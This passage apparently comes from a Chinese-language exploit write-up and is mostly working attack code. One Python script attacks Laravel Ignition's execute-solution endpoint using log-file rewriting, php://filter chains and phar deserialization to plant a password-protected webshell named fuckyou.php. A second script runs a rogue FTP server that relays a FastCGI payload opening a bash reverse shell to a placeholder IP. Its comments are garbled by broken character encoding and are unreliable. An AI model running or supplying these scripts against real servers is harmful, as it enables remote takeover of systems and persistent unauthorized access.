3=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def filterlog(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def phar(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"\\storage\\\\logs\\\\laravel.log\\\\test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def pharl(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"/storage/logs/laravel.log/test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def path(url): req=requests.get(url).text pattern = re.compile(r'(\\#\\d*\\ (.*)(?:\\/|\\\\)vendor)') m=pattern.findall(req) return m[0][1] if __name__=='__main__': print( ''' â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–’â–ˆâ–ˆ â–’ â–“â–ˆ â–€ â–’â–ˆâ–ˆâ–€ â–€â–ˆ â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ â–’ â–‘ â–“â–ˆâ–ˆâ–„ â–’â–ˆâ–ˆâ–ˆ â–’â–“â–ˆ â–„ â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–’â–‘ â–“â–ˆâ–ˆâ–„ â–’ â–ˆâ–ˆâ–’â–’â–“â–ˆ â–„ â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„ â–’â–ˆâ–ˆ â–ˆâ–ˆâ–‘ â–’ â–ˆâ–ˆâ–’ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–’â–ˆâ–ˆâ–’ â–‘ â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ â–’ â–’â–“â–’ â–’ â–‘â–‘â–‘ â–’â–‘ â–‘â–‘ â–‘â–’ â–’ â–‘â–’â–“â–’â–‘ â–‘ â–‘â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘ â–’â–‘â–’â–‘â–’â–‘ â–’ â–’â–“â–’ â–’ â–‘ â–‘ â–‘â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–’ â–‘â–’ â–‘ â–‘â–’ â–‘ â–’â–‘ â–‘ â–’ â–’â–‘ â–‘ â–‘â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘â–‘ â–‘â–‘ â–‘ â–‘ â–‘ â–‘ â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ ''') url=sys.argv[1]+\"/_ignition/execute-solution\" clearlog(url) clearlog(url) clearlog(url) clearlog(url) clearlog(url) if(AA(url).status_code==500): if(\":\" in path(url)): print(\"windows\") if(sendpayloadwindows(url).status_code==500): if(filterlog(url).status_code==200): if(phar(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"[+]webshellåœ°å€:\"+sys.argv[1]+\"/fuckyou.php,å¯†ç :pass\") else: print(\"[-]æ¼æ´ä¸å­˜åœ¨\") if(\":\" not in path(url)): print(\"linux\") if(sendpayloadlinux(url).status_code==500): if(filterlog(url).status_code==200): if(pharl(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"webshellåœ°å€:\"+sys.argv[1]+\"/fuckyou.php,å¯†ç :pass\") else: print(\"[-]æ¼æ´ä¸å­˜åœ¨\") æ ¹æ®è·¯å¾„å¯†ç ä½¿ç”¨å“¥æ–¯æ‹‰è¿æ¥æœ¨é©¬ FTPè„šæœ¬ # -*- coding: utf-8 -*- # @Time : 2021/1/13 6:56 ä¸‹åˆ # @Author : tntaxin # @File : ftp_redirect.py # @Software: import socket from urllib.parse import unquote # å¯¹gopherusç”Ÿæˆçš„payloadè¿›è¡Œä¸€æ¬¡urldecode payload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\") payload = payload.encode('utf-8') host = '0.0.0.0' port = 23 sk = socket.socket() sk.bind((host, port)) sk.listen(5) # ftpè¢«åŠ¨æ¨¡å¼çš„passvie port,ç›‘å¬åˆ°1234 sk2 = socket.socket() sk2.bind((host, 1234)) sk2.listen() # è®¡æ•°å™¨ï¼Œç”¨äºåŒºåˆ†æ˜¯ç¬¬å‡ æ¬¡ftpè¿æ¥ count = 1 while 1: conn, address = sk.accept() conn.send(b\"200 \\n\") print(conn.recv(20)) # USER aaa\\r\\n å®¢æˆ·ç«¯ä¼ æ¥ç”¨æˆ·å if count == 1: conn.send(b\"220 ready\\n\") else: conn.send(b\"200 ready\\n\") print(conn.recv(20)) # TYPE I\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯ä»¥ä»€ä¹ˆæ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒTYPE Iè¡¨ç¤ºäºŒè¿›åˆ¶ï¼Œ TYPE Aè¡¨ç¤ºæ–‡æœ¬ if count == 1: conn.send(b\"215 \\n\") else: conn.send(b\"200 \\n\") print(conn.recv(20)) # SIZE /123\\r\\n å®¢æˆ·ç«¯è¯¢é—®æ–‡ä»¶/123çš„å¤§å° if count == 1: conn.send(b\"213 3 \\n\") else: conn.send(b\"300 \\n\") print(conn.recv(20)) # EPSV\\r\\n' conn.send(b\"200 \\n\") print(conn.recv(20)) # PASV\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è¿›å…¥è¢«åŠ¨è¿æ¥æ¨¡å¼ if count == 1: conn.send(b\"227 127,0,0,1,4,210\\n\") # æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234 else: conn.send(b\"227 127,0,0,1,35,40\\n\") # ç«¯å£è®¡ç®—è§„åˆ™ï¼š35*256+40=9000 print(conn.recv(20)) # 